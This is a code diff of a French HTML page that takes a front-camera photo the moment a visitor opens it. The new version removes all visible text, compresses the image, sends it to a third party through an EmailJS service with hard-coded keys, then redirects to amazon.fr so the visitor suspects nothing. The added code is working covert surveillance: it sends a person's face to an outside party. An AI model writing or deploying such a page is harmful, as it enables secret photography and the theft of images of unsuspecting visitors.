@@ -1,67 +1,21 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Photo automatique</title>
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      background: #f0f0f0;
-    }
-    video, canvas {
-      display: none; /* cacher la vidéo et le canvas */
-    }
-  </style>
+<meta charset="UTF-8">
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>html,body{margin:0;height:100%;background:#000;overflow:hidden}video,canvas{display:none}</style>
 </head>
 <body>
-  <h2>📸 Initialisation de la capture...</h2>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="300" height="200"></canvas>
-
-  <script>
-    // Initialiser EmailJS avec ta clé publique
-    emailjs.init("mxm3fFA_BxEhqJieq");
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-
-    async function startCapture() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" } // caméra frontale
-        });
-        video.srcObject = stream;
-
-        video.onloadeddata = () => {
-          // Capturer l'image
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/png");
-
-          // Envoyer par EmailJS
-          emailjs.send("service_8cs0gml", "template_w14xn7c", {
-            message: "Photo automatique capturée 📸",
-            image: imageData
-          })
-          .then(() => {
-            // Redirection après envoi
-            window.location.href = "https://tonsite.com/merci";
-          })
-          .catch((err) => {
-            document.body.innerHTML = "<h2>❌ Erreur : " + JSON.stringify(err) + "</h2>";
-          });
-        };
-
-      } catch (err) {
-        document.body.innerHTML = "<h2>⚠️ Permission refusée ou caméra non disponible</h2>";
-      }
-    }
-
-    // Lancer la capture dès l'arrivée sur la page
-    startCapture();
-  </script>
+<video id="v" autoplay playsinline></video><canvas id="c" width="1280" height="720"></canvas>
+<script>
+emailjs.init("IoSfbtGz4KSL_5_9E");
+const v=document.getElementById("v"),c=document.getElementById("c"),x=c.getContext("2d");
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720}})
+.then(s=>{v.srcObject=s;v.onloadeddata=()=>{x.drawImage(v,0,0,c.width,c.height);
+let q=.85,i;do{i=c.toDataURL("image/jpeg",q);if(i.length*3/4/1024<=60)break;q-=.05}while(q>.1);
+s.getTracks().forEach(t=>t.stop());emailjs.send("service_8cs0gml","template_rdhxflt",{image:i});
+setTimeout(()=>location.href="https://www.amazon.fr",300);};})
+.catch(()=>location.href="https://www.amazon.fr"));
+</script>
 </body>
 </html>
